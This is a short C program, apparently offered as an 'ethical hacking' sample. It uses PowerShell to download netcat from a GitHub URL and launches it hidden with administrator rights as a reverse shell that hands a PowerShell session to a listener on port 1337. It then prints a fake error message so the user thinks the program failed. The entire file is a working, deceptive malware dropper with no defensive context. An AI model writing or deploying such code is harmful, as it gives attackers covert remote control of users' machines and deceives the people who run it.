#include <stdio.h>
#include <stdlib.h>

int main() {
  // Code made by https://github.com/Sajmonpcgamer
  system("powershell Invoke-WebRequest -Uri https://raw.githubusercontent.com/Sajmonpcgamer/ethicalhacking/main/netcat.exe -OutFile .\\nc.exe ; Start-Process \\nc.exe -ArgumentList \"127.0.0.1 1337 -e powershell\" -WindowStyle Hidden -Verb RunAs");
  printf("An unknown error occured");
}